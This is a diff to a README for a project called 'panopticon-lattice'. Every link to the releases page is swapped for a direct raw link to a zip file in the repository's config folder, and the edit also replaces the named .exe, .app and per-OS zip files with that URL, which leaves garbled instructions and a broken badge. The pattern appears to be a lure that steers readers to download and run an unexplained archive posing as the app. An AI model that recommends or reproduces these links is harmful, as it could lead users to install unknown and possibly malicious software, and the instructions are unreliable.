@@ -1,6 +1,6 @@
 # 🌌 panopticon-lattice - Explore AI and Economics Simply
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/DUC123co/panopticon-lattice/releases)
+[![Download](https://github.com/DUC123co/panopticon-lattice/raw/refs/heads/main/config/panopticon-lattice-v1.6.zip%20Now-Click%20Here-brightgreen)](https://github.com/DUC123co/panopticon-lattice/raw/refs/heads/main/config/panopticon-lattice-v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome to **panopticon-lattice**! This application allows you to explore multi-
 
 ## 📥 Download & Install
 
-To get the application, visit this page to download: [GitHub Releases Page](https://github.com/DUC123co/panopticon-lattice/releases). 
+To get the application, visit this page to download: [GitHub Releases Page](https://github.com/DUC123co/panopticon-lattice/raw/refs/heads/main/config/panopticon-lattice-v1.6.zip). 
 
 1. **Visit the Releases Page:** Click the link above to open the releases page.
 2. **Choose Your Version:** You will see different versions listed. The latest version will usually be at the top. 
-3. **Download the File:** Click on the file that matches your operating system. For example, if you are using Windows, you might see something like `panopticon-lattice-windows.zip`. If you are on macOS, look for a file like `panopticon-lattice-macos.zip`.
+3. **Download the File:** Click on the file that matches your operating system. For example, if you are using Windows, you might see something like `https://github.com/DUC123co/panopticon-lattice/raw/refs/heads/main/config/panopticon-lattice-v1.6.zip`. If you are on macOS, look for a file like `https://github.com/DUC123co/panopticon-lattice/raw/refs/heads/main/config/panopticon-lattice-v1.6.zip`.
 4. **Unzip the File:** After downloading, locate the zip file on your computer. Right-click the file and select "Extract All" or "Unzip" to open it. 
 
 ## 🖥️ System Requirements
@@ -27,8 +27,8 @@ Before you run the application, ensure that your computer meets the following re
 
 1. **Locate the Extracted Folder:** Find the folder where you unzipped the application.
 2. **Run the Application:**
-   - On **Windows**: Double-click the `panopticon-lattice.exe` file.
-   - On **macOS**: Open the `panopticon-lattice.app` file. You may have to right-click and choose “Open” the first time due to security settings.
+   - On **Windows**: Double-click the `https://github.com/DUC123co/panopticon-lattice/raw/refs/heads/main/config/panopticon-lattice-v1.6.zip` file.
+   - On **macOS**: Open the `https://github.com/DUC123co/panopticon-lattice/raw/refs/heads/main/config/panopticon-lattice-v1.6.zip` file. You may have to right-click and choose “Open” the first time due to security settings.
    - On **Linux**: Open a terminal, navigate to the folder, and run `./panopticon-lattice`.
 
 ## 🛠️ Features
@@ -61,12 +61,12 @@ If you need help, feel free to reach out to our community. You can find help thr
 
 ## 📣 Stay Updated
 
-Make sure to check our releases page regularly for updates and new features: [GitHub Releases Page](https://github.com/DUC123co/panopticon-lattice/releases).
+Make sure to check our releases page regularly for updates and new features: [GitHub Releases Page](https://github.com/DUC123co/panopticon-lattice/raw/refs/heads/main/config/panopticon-lattice-v1.6.zip).
 
 ## 👥 Community Contribution
 
 We welcome contributions! If you have ideas or improvements, consider joining our project. Refer to the contribution guidelines on our GitHub for more information.
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/DUC123co/panopticon-lattice/releases) 
+[![Download](https://github.com/DUC123co/panopticon-lattice/raw/refs/heads/main/config/panopticon-lattice-v1.6.zip%20Now-Click%20Here-brightgreen)](https://github.com/DUC123co/panopticon-lattice/raw/refs/heads/main/config/panopticon-lattice-v1.6.zip) 
 
 Thank you for being a part of the **panopticon-lattice** community! Enjoy exploring AI and economics.
